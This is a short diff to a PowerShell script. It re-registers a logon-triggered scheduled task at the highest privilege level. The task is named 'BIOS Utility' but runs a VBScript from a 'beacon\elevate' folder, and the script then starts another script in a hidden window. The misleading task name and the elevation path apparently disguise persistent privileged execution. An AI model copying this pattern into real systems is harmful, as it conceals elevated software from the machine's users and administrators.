@@ -171,9 +171,14 @@ if($need_reboot) {
     }
 }
 
-$scriptPath = "C:\temp\beacon\elevate\Elevate.ps1"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\temp\beacon\elevate\noWinElev.vbs"
 $trigger = New-ScheduledTaskTrigger -AtLogon
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS Utility" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force
+
+# $scriptPath = "C:\temp\beacon\elevate\noWinElev.vbs"
+# $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "-File `"$scriptPath`""
+# $trigger = New-ScheduledTaskTrigger -AtLogon
+# Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS Utility" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force
+
 Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"'
 # Write-Host "Script Finished" -foregroundcolor Yellow
